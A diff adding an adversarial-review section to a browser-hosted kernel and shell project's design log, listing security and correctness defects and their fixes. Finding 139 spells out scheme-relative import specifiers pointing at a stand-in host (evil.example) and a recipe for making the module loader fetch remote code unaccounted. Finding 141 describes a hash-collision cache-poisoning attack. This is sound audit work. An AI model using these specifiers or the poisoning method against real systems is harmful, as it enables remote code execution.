@@ -1049,3 +1049,151 @@ cancellation design.
     `strftime` here, so the field is omitted rather than rendered in a format nothing else uses.
     A program on the durable volume larger than 1 MiB is -EFBIG (`PROGRAM_MAX`).
     *Defect, unfixed:* none known at the close of M5.
+
+## M5's adversarial review — what two critics found, and what it cost
+
+Each entry is a finding verified against the code before it was acted on. Two were given the
+artifact and the acceptance criteria and never the author's conclusion, as
+`~/.claude/rules/adversarial-review.md` requires; both found things the author was certain were
+fine, and the two worst defeated M5's own central claim.
+
+139. **THE FIX HAD MOVED THE HOLE, NOT CLOSED IT.** Constraint 123 says `SYS_spawn` no longer hands
+    a process-supplied path to `fetch`. It was true and it was not enough: the loader rewrote any
+    `/…`-shaped *import specifier* through `new URL(specifier, base)`, and `new URL` RESOLVES A
+    SCHEME-RELATIVE SPECIFIER OFF-ORIGIN. Measured against `http://localhost:8000/www/m5.html`:
+    `"//evil.example/p.mjs"` → `http://evil.example/p.mjs`, `"/\evil.example/p.mjs"` → the same (a
+    backslash is a slash to the URL parser), `"///x"` → `http://x/`, and `"/admin/whatever"` → an
+    arbitrary GET on the page's own origin. A bare `https://elsewhere/q.mjs` was not matched at all
+    and travelled into the Blob verbatim. Four syscalls from any process — write a program to
+    `/tmp` whose text says `import "//elsewhere/p.mjs"`, chmod it, spawn it — and the CHILD's module
+    loader fetched and evaluated remote code while **the kernel's own accounting stayed at zero
+    loads**, which is the worst property a security fix can have. COEP does not stop it: a module
+    script is fetched in CORS mode, so `Access-Control-Allow-Origin: *` satisfies CORP. Deleting
+    `fetch` in M6 will not stop it either — static `import` is the module loader, not `fetch`.
+    **Closed by an ALLOWLIST of exact literal specifiers** (`PROGRAM_IMPORTS`), compared by
+    equality, so no process-controlled string reaches `new URL` at all. `www/m5.html`'s `no_url`
+    section now asserts both halves over seven programs, with `/src/abi.mjs` as the positive
+    control so "everything was refused" cannot pass for a working allowlist.
+    **WHAT REMAINS OPEN:** a dynamic `import(expr)` whose argument is computed at run time cannot
+    be caught by reading the text, and no scanner can. The literal form is caught. The answer is a
+    Content-Security-Policy on the document, which bounds what the renderer will fetch whatever the
+    text says — M6 owns it, and it is the second half of constraint 41.
+140. **A four-line program panicked the whole kernel.** `src/libos/process.mjs`'s `self.onerror`
+    reported the fault and did not CANCEL the event, so the runtime re-fired it at the `Worker`
+    object in the parent — where the kernel's `worker.onerror` called `panic`, which stores K_PANIC
+    and tells every live process through its own SAB that the kernel is dead. A program containing
+    `setTimeout(() => { throw 0 })` therefore stopped the system. The wiring predates M5; what M5
+    changed is that a process now chooses its own program text, so it needed no cooperation from
+    the page. Fixed in both halves: the libos returns true to cancel, and a process worker's error
+    is reported as THAT PROCESS's fault and reaped as one. It earned itself immediately — the next
+    run named `ReferenceError: ensureStdin is not defined` in the shell instead of panicking.
+141. **The image cache was unbounded and collidable, and the two needed different fixes.**
+    *Unbounded:* `PROGRAM_MAX` caps one image and nothing capped their number, so a process
+    looping over "write a 1 MiB program with one byte varied, spawn it" retained a Blob and a blob
+    URL per turn — ~1 GiB after a thousand, and the renderer dies and takes every process with it.
+    Now bounded at `IMAGE_CACHE_BYTES` (8 MiB, ~47x all of `/usr/bin`) with eviction oldest-first
+    and `revokeObjectURL`, never evicting the entry the current load just made.
+    *Collidable:* FNV-1a-32 collides on demand — a meet-in-the-middle over four tail bytes, and the
+    critic produced a 38-byte file matching a real program's hash and length. The dangerous
+    direction is POISONING, not reuse: an unprivileged process execs its forgery once and a LATER
+    `spawn` of the real program, from any process including a root shell, runs the attacker's
+    bytes, with the mount, the permission check and the read all behaving correctly. Now a hit is
+    confirmed by COMPARING THE BYTES; the hash is reduced to an index.
+    `bench/m5-exec/controls.py` carries both halves as a two-stage control in M2's shape:
+    collapsing the key to a constant must move NOTHING (the comparison absorbs it), and collapsing
+    it *and* removing the comparison must move 17 — measured. If stage 1 passed either way the
+    comparison was testing nothing.
+142. **`exec` could splice two generations, and closing its description could publish another
+    process's un-fsynced bytes.** `readFd` takes the inode's lock PER CALL, so a two-chunk program
+    read interleaved by another process's `fsync` of the same file produced chunk 0 from generation
+    *n* and chunk 1 from *n+1* — a module that exists in no file, then hashed, cached and run.
+    Linux cannot reach this: the image is pinned and a write to a running executable is ETXTBSY.
+    Now the whole read runs inside one `withInode`, through `readHeld`.
+    And `closeFd` runs `commit(d)` on any non-read-only file description, where `commitOnce` with
+    nothing staged publishes the blob's PHYSICAL extent whenever it exceeds the metadata's size —
+    which is exactly where another description's outstanding append lives. So `spawn`, a read,
+    could publish a generation and append a journal record for a writer that never called `fsync`.
+    exec now gives back only what `openFd` took: `release(ino)` under the inode's lock, never
+    `closeFd`.
+143. **A quoted redirection target was still expanded, and `> '*'` truncated an unrelated file.**
+    `parse` kept only the target token's TEXT, so the shell rebuilt it as an unquoted word: `echo
+    hi > '*'` globbed, matched `notes.txt`, and opened it `O_TRUNC`. The user quoted `*` precisely
+    to mean a file called `*`. `> '$x'` and `> '%1'` were the same mistake in two other spellings.
+    `parse` now keeps the whole token.
+144. **Quoting was tracked per WORD, so `echo "$HOME"` printed `$HOME`.** One quoted character
+    suppressed every expansion across the word — measured: `ls "no"*` did not glob either — while
+    this file and `shlex.mjs`'s own header both claimed the opposite. A word is now a LIST OF SPANS,
+    each recording `bare` / `single` / `double`, which is what makes the three rules expressible at
+    all: variables expand in bare and double spans, globs are live only in bare ones, and nothing
+    expands in single ones. It also fixed 143's root cause and made `magic` honest — a `*` that
+    arrived from a variable's value is not re-read as a pattern.
+145. **A throw out of the redirection path left a stage parked in `write` forever.** An ambiguous
+    redirect, an unknown job spec or a bad substitution threw past BOTH the pipe-close loop and the
+    wait: `cat big | cat > '*'` left the shell holding the pipe's read end, so the first stage
+    filled 64 KiB, parked, and never got EPIPE — with no job row, so nothing could ever reap it and
+    no job spec could kill it. Every opened fd leaked with it, 1,021 occurrences exhausting
+    `OPEN_MAX`. Now the cleanup is a function that runs in a `finally`, the spawn loop is its own
+    function so no `break` can step past it, and expansion failures are error RETURNS.
+146. **A 4,096-byte line was split in half and both halves ran.** The read loop split one read on
+    newlines, justified by the terminal's canonical mode — but the same loop reads a SCRIPT, where
+    fd 0 is a pipe and there is no line discipline. Measured: a 4,090-byte first line made
+    `echo hello` into `echo h` plus `sh: ello: command not found`, and with a multi-byte character
+    at the seam the word `echo` itself was torn and both halves ran. Silent wrong execution. The
+    loop now carries the partial tail between reads with a streaming decoder, and runs an
+    unterminated final line at end of input.
+147. **`%1` had no unambiguous spelling until it expanded to TWO words.** A job spec expanding to
+    the positive leader pid signalled one stage, so `sleep 60 | sleep 60 &` then `kill %1` left the
+    second stage running for its full minute with nothing able to reach it. Expanding to `-pgid`
+    instead made `kill %1` into `kill -3`, and `kill` reads a leading `-<digits>` as a signal —
+    POSIX's obsolescent form — so the call answered `usage:` with signal 3 consumed and no target.
+    **Pids here start at 1, so a job's group is routinely a number that is also a signal:** the
+    ambiguity is the common case, not a corner. A job spec now expands to `--` and the negative
+    group, which is the one spelling `kill` cannot misread, and `kill` needed nothing added for it
+    beyond POSIX's own end-of-options. A spec is also a WHOLE WORD or it is literal, so
+    `cat /tmp/a%20b` is a path again.
+148. **`/dev/zero` is 256 bytes, so a `-c` shell with no stdin fed 256 NULs to every reader.**
+    `ensureStdin` opened it to hold fd 0 — which it does — but `sh -c "wc -c"` then printed 256
+    where it must print 0. `/dev/null` is in the same directory, is 0 bytes, and means what the
+    function needed.
+149. **The kernel advertised nine signals it could not honour.** `signalOf` accepts STOP, TSTP,
+    TTIN, TTOU, CONT, QUIT, ILL, ABRT and SEGV; `FATAL_DEFAULT` held four rows. So `kill -ABRT
+    <pid>` returned 0, the target's blocked `read` answered -EINTR, `drainSignals` discarded the
+    bit and the process KEPT RUNNING, where POSIX's default for each is to terminate. Adding `kill`
+    made the gap a public surface — `kill -l` prints the whole table. QUIT, ABRT, ILL and SEGV are
+    now fatal by default. **STOP, TSTP, TTIN, TTOU and CONT remain accepted and inert**, because
+    there is no stopped state in this kernel to put a process into; that is a feature, not a fix,
+    and it is recorded here rather than left as a name that is accepted and ignored.
+150. **Smaller, each with its own fix:** `wantX` + `create` created a file and skipped the execute
+    check, contradicting its own comment (now ENOENT, as promised); `chdir` answered EACCES for a
+    non-executable file and ENOTDIR for the same mistake on a generated mount, because the
+    permission check ran before the type check (now type first, so the `-ENOTDIR` line is
+    reachable); a failed `dup` in a redirected builtin CLOSED the shell's stdout, after which
+    `pipe2` handed out fd 1 as a pipe end (now the save is checked and the redirection refused);
+    `wait $!` was a silent no-op for a multi-stage job because it matched only pgids (now pid or
+    pgid); a backgrounded builtin answered `command not found`, exit 127 (now refused with a
+    reason, exit 2); a `UsageError` from EXPANSION was reported as a defect in the shell with a
+    stack trace and exit 70 (now a usage error, exit 2); `ls` stripped trailing whitespace off the
+    last column, so a file named `"  "` printed as a blank line; `ps` discarded its operands and
+    exited 0 for `ps 123`; `head -n` with no argument said "use -n n"; and `sleep 0.0000000001`
+    rounded to a zero-nanosecond sleep, the exact value constraint 100's note records as having
+    cost two proofs.
+151. **`head -1` had to be supported, not refused.** It was refused as an obsolescent form this
+    program does not carry — and MILESTONES.md M5's own headline proof is written `yes | head -1`,
+    so the first thing anybody typed hit the refusal. A program may not refuse the spelling its
+    own acceptance criterion uses.
+152. **The property four programs were written around had no spelling in this system.** `cat`,
+    `head`, `grep` and `std.eachLine` all stream rather than slurp, and every one cites
+    `yes | head -1` as the reason — a case no check could reach, because there was no endless
+    source: `/dev/zero` is an honest finite 256-byte file. `yes` is the eleventh program where the
+    milestone asked for ten, and it is what makes M4's headline proof sayable in shell. A comment
+    citing a case the system cannot express is a comment nobody can check.
+153. **M5 shows constraint 121's flake too, and it fails closed.** `--negative spawn-self` reported
+    "39 expectation(s) about the control itself unmet" ONCE in the eight runs taken while M5 was
+    being closed. The signature is constraint 121's exactly: the page comes out BROKEN with zero
+    labels recorded, so every declared label reads as "recorded no expectation by that name" and
+    the gate counts one problem per label plus the outcome. Both times it was a full-suite negative
+    run started shortly after a previous Chrome; `--only m5` passed 3 of 3 and the full phase
+    passed on the next attempt. The cause is the one constraint 121 did not identify, and the
+    property that matters is unchanged: **a run that could not be measured is reported as BROKEN,
+    never as a pass**. Treat a single red here as unmeasured and re-run it alone, with Chrome given
+    time to exit — `pkill` returns before it is gone.
